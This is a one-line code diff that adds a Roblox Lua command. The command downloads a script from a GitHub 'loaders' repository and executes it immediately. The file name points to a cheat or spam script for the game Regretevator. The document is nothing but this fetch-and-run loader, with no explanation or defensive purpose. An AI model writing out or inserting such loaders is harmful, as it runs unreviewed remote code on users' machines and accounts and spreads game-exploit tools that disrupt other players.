@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/codefinchpalace/loaders/main/loaders/regretevator-elevator-simulator-spam6-x90m4q4bo25cbq.lua"))()
